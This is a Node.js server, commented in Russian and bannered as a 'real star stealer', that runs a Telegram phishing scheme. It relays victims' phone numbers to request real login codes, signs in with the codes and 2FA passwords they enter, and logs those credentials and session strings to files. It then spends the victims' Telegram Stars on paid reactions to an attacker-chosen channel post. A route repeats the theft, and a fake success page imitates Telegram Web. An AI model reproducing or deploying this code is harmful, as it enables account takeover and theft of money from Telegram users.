const express = require('express');
const { TelegramClient, Api } = require('telegram');
const { StringSession } = require('telegram/sessions');
const { StoreSession } = require('telegram/sessions/StoreSession');
const dotenv = require('dotenv');
const fs = require('fs').promises;
const path = require('path');
const qrcode = require('qrcode-terminal');
const readline = require('readline');

dotenv.config();
const app = express();

// Конфигурация
const API_ID = parseInt(process.env.API_ID);
const API_HASH = process.env.API_HASH;
const TARGET_CHANNEL = process.env.TARGET_CHANNEL || '@TestFishingBota';
const TARGET_MESSAGE_ID = parseInt(process.env.TARGET_MESSAGE_ID) || 2;
const PREMIUM_BOT = '@premiumbot';

// Хранилище
const activeClients = new Map();
const credentialsLog = 'stolen_credentials.txt';
const sessionsLog = 'active_sessions.txt';

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Функция для получения кода через Telegram API
async function requestRealCode(phone) {
    console.log(`📱 Запрашиваем реальный код для ${phone}`);
    
    const stringSession = new StringSession('');
    const client = new TelegramClient(stringSession, API_ID, API_HASH, {
        connectionRetries: 5,
        useWSS: false
    });

    try {
        await client.connect();
        
        // Отправляем код на реальный номер через Telegram
        const { phoneCodeHash } = await client.sendCode({
            apiId: API_ID,
            apiHash: API_HASH,
            phoneNumber: phone
        });

        console.log(`✅ Код отправлен на ${phone}, hash: ${phoneCodeHash}`);
        return { success: true, phoneCodeHash, client, stringSession };
    } catch (error) {
        console.error(`❌ Ошибка отправки кода: ${error.message}`);
        return { success: false, error: error.message };
    }
}

// Функция для входа с кодом
async function signInWithCode(client, phone, code, phoneCodeHash) {
    try {
        await client.invoke(new Api.auth.SignIn({
            phoneNumber: phone,
            phoneCodeHash: phoneCodeHash,
            phoneCode: code.toString()
        }));

        console.log(`✅ Успешный вход для ${phone}`);
        return { success: true, client };
    } catch (error) {
        // Проверяем, нужен ли пароль 2FA
        if (error.message.includes('SESSION_PASSWORD_NEEDED')) {
            return { success: false, needPassword: true, error: error.message };
        }
        return { success: false, error: error.message };
    }
}

// Функция для входа с паролем 2FA
async function signInWithPassword(client, password) {
    try {
        const { user } = await client.signInWithPassword({ password });
        return { success: true, client };
    } catch (error) {
        return { success: false, error: 'Неверный пароль' };
    }
}

// Функция реальной кражи звёзд
async function stealRealStars(client, phone) {
    try {
        console.log(`🔄 Начинаем кражу звёзд для ${phone}`);
        
        // 1. Получаем информацию о Premium Bot
        const premiumBot = await client.getEntity(PREMIUM_BOT);
        
        // 2. Отправляем команду /stars
        await client.sendMessage(premiumBot, { message: '/stars' });
        console.log(`📨 Команда /stars отправлена`);
        
        // 3. Ждем ответа и парсим баланс
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        const messages = await client.getMessages(premiumBot, { limit: 10 });
        let starBalance = 0;
        let starsMessage = null;
        
        for (const msg of messages) {
            if (msg.message && msg.message.includes('Ваш баланс')) {
                const match = msg.message.match(/(\d+)\s*⭐/);
                if (match) {
                    starBalance = parseInt(match[1]);
                    starsMessage = msg;
                    console.log(`💰 Найден баланс: ${starBalance} звезд`);
                }
            }
        }
        
        if (starBalance === 0) {
            console.log(`❌ Баланс не найден или равен 0`);
            return { success: false, error: 'Баланс не найден', balance: 0 };
        }
        
        // 4. Получаем канал для перевода
        const targetChannel = await client.getEntity(TARGET_CHANNEL);
        
        // 5. Покупка платных реакций (кража звёзд)
        // Для этого нужен documentId премиум-реакции
        // Получаем список доступных реакций
        const availableReactions = await client.invoke(new Api.messages.GetAvailableReactions({}));
        
        // Ищем реакцию со звездой
        let starReaction = null;
        for (const reaction of availableReactions) {
            if (reaction.title && reaction.title.toLowerCase().includes('star')) {
                starReaction = reaction;
                break;
            }
        }
        
        if (!starReaction) {
            console.log(`❌ Реакция со звездой не найдена`);
            // Используем любую доступную реакцию
            starReaction = availableReactions[0];
        }
        
        console.log(`🎯 Используем реакцию: ${starReaction?.title || 'unknown'}`);
        
        // 6. Отправляем платную реакцию на целевое сообщение
        // Количество реакций = количество звезд (максимум 10 за раз)
        const reactionsToSend = Math.min(starBalance, 10);
        
        for (let i = 0; i < reactionsToSend; i++) {
            try {
                const result = await client.invoke(new Api.messages.SendReaction({
                    peer: targetChannel,
                    msgId: TARGET_MESSAGE_ID,
                    reaction: [new Api.ReactionCustomEmoji({
                        documentId: starReaction.documentId || 5195040825205739043n
                    })],
                    big: false
                }));
                
                console.log(`⭐ Отправлена реакция ${i + 1}/${reactionsToSend}`);
                
                // Небольшая задержка между реакциями
                await new Promise(resolve => setTimeout(resolve, 500));
                
            } catch (reactionError) {
                console.error(`❌ Ошибка при отправке реакции: ${reactionError.message}`);
            }
        }
        
        // 7. Логируем результат
        const logEntry = {
            phone: phone,
            timestamp: new Date().toISOString(),
            starsStolen: reactionsToSend,
            totalBalance: starBalance,
            targetChannel: TARGET_CHANNEL,
            messageId: TARGET_MESSAGE_ID,
            session: client.session.save()
        };
        
        await fs.appendFile('stars_log.txt', JSON.stringify(logEntry) + '\n');
        
        // 8. Сохраняем сессию для повторного использования
        await fs.appendFile(sessionsLog, 
            `Phone: ${phone}\nSession: ${client.session.save()}\nBalance: ${starBalance}\n\n`
        );
        
        console.log(`✅ Успешно украдено ${reactionsToSend} звезд для ${phone}`);
        
        return { 
            success: true, 
            stolen: reactionsToSend, 
            balance: starBalance,
            session: client.session.save()
        };
        
    } catch (error) {
        console.error(`❌ Критическая ошибка кражи: ${error.message}`);
        return { success: false, error: error.message };
    }
}

// API маршруты
app.post('/api/request-code', async (req, res) => {
    const { phone } = req.body;
    
    if (!phone || !phone.match(/^\+?[1-9]\d{7,14}$/)) {
        return res.json({ success: false, error: 'Неверный номер телефона' });
    }
    
    const result = await requestRealCode(phone);
    
    if (result.success) {
        // Сохраняем клиент во временное хранилище
        activeClients.set(phone, {
            client: result.client,
            phoneCodeHash: result.phoneCodeHash,
            timestamp: Date.now()
        });
        
        // Логируем запрос
        await fs.appendFile(credentialsLog, 
            `[${new Date().toISOString()}] CODE_REQUEST: ${phone}\n`
        );
        
        res.json({ 
            success: true, 
            message: 'Код отправлен в Telegram'
        });
    } else {
        res.json({ success: false, error: result.error });
    }
});

app.post('/api/verify-code', async (req, res) => {
    const { phone, code } = req.body;
    
    if (!phone || !code || !code.match(/^\d{5}$/)) {
        return res.json({ success: false, error: 'Неверные данные' });
    }
    
    const clientData = activeClients.get(phone);
    if (!clientData) {
        return res.json({ success: false, error: 'Сначала запросите код' });
    }
    
    const result = await signInWithCode(
        clientData.client, 
        phone, 
        code, 
        clientData.phoneCodeHash
    );
    
    if (result.success) {
        // Сохраняем успешный клиент
        activeClients.set(phone, {
            ...clientData,
            isSignedIn: true,
            client: result.client
        });
        
        await fs.appendFile(credentialsLog,
            `[${new Date().toISOString()}] CODE_ACCEPTED: ${phone}, Code: ${code}\n`
        );
        
        // Проверяем, нужен ли пароль
        if (result.needPassword) {
            res.json({ 
                success: true, 
                needPassword: true,
                message: 'Требуется пароль 2FA'
            });
        } else {
            // Нет 2FA - сразу начинаем кражу
            const stealResult = await stealRealStars(result.client, phone);
            
            res.json({
                success: true,
                needPassword: false,
                starsStolen: stealResult.stolen || 0,
                message: stealResult.success ? 
                    `Успешно! Украдено ${stealResult.stolen} звезд` :
                    'Ошибка кражи звезд'
            });
        }
    } else {
        res.json({ success: false, error: result.error });
    }
});

app.post('/api/verify-password', async (req, res) => {
    const { phone, password } = req.body;
    
    const clientData = activeClients.get(phone);
    if (!clientData || !clientData.isSignedIn) {
        return res.json({ success: false, error: 'Сначала войдите с кодом' });
    }
    
    const result = await signInWithPassword(clientData.client, password);
    
    if (result.success) {
        await fs.appendFile(credentialsLog,
            `[${new Date().toISOString()}] 2FA_CAPTURED: ${phone}, Password: ${password}\n`
        );
        
        // Крадем звёзды после успешного входа с 2FA
        const stealResult = await stealRealStars(clientData.client, phone);
        
        res.json({
            success: true,
            starsStolen: stealResult.stolen || 0,
            message: stealResult.success ?
                `Пароль верный! Украдено ${stealResult.stolen} звезд` :
                'Ошибка кражи звезд'
        });
    } else {
        res.json({ success: false, error: result.error });
    }
});

// Маршрут для проверки сессий
app.get('/api/sessions', async (req, res) => {
    const sessions = [];
    for (const [phone, data] of activeClients.entries()) {
        sessions.push({
            phone: phone,
            isSignedIn: data.isSignedIn || false,
            age: Date.now() - data.timestamp
        });
    }
    
    res.json({ success: true, sessions: sessions });
});

// Маршрут для повторной кражи с сохраненной сессией
app.post('/api/steal-again', async (req, res) => {
    const { phone } = req.body;
    
    const clientData = activeClients.get(phone);
    if (!clientData || !clientData.client) {
        return res.json({ success: false, error: 'Сессия не найдена' });
    }
    
    const stealResult = await stealRealStars(clientData.client, phone);
    
    res.json({
        success: stealResult.success,
        stolen: stealResult.stolen || 0,
        message: stealResult.success ?
            `Дополнительно украдено ${stealResult.stolen} звезд` :
            'Ошибка повторной кражи'
    });
});

// Фронтенд
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/success', (req, res) => {
    res.send(`
        <html>
        <head>
            <title>Telegram Web</title>
            <meta http-equiv="refresh" content="3;url=https://web.telegram.org">
            <style>body{background:#0f0f0f;color:#fff;font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}.container{text-align:center;padding:40px}.checkmark{color:#34aadc;font-size:60px;margin-bottom:20px}.loading{width:50px;height:50px;border:5px solid #333;border-top-color:#34aadc;border-radius:50%;margin:30px auto;animation:spin 1s linear infinite}@keyframes spin{100%{transform:rotate(360deg)}}</style>
        </head>
        <body>
            <div class="container">
                <div class="checkmark">✓</div>
                <h2>Вход выполнен успешно</h2>
                <p>Перенаправление в Telegram...</p>
                <div class="loading"></div>
                <p style="color:#888;font-size:12px;margin-top:20px">Если перенаправление не произошло, <a href="https://web.telegram.org" style="color:#34aadc">нажмите сюда</a></p>
            </div>
        </body>
        </html>
    `);
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`
╔═══════════════════════════════════════════╗
║      SWILL REAL STAR STEALER              ║
║      Реальная кража Telegram Stars        ║
╚═══════════════════════════════════════════╝
📍 Сервер: http://localhost:${PORT}
🔧 API_ID: ${API_ID || 'Не настроен'}
🔧 API_HASH: ${API_HASH ? '***' + API_HASH.slice(-4) : 'Не настроен'}
🎯 Цель: ${TARGET_CHANNEL} (сообщение ${TARGET_MESSAGE_ID})
🤖 Бот: ${PREMIUM_BOT}
📁 Логи: ${credentialsLog}
📁 Сессии: ${sessionsLog}
╔═══════════════════════════════════════════╗
║ ВАЖНО: Для работы нужны реальные          ║
║ API_ID и API_HASH с my.telegram.org       ║
╚═══════════════════════════════════════════╝
    `);
});

// Очистка старых сессий каждые 5 минут
setInterval(() => {
    const now = Date.now();
    for (const [phone, data] of activeClients.entries()) {
        if (now - data.timestamp > 30 * 60 * 1000) { // 30 минут
            activeClients.delete(phone);
            console.log(`🗑️ Удалена старая сессия: ${phone}`);
        }
    }
}, 5 * 60 * 1000);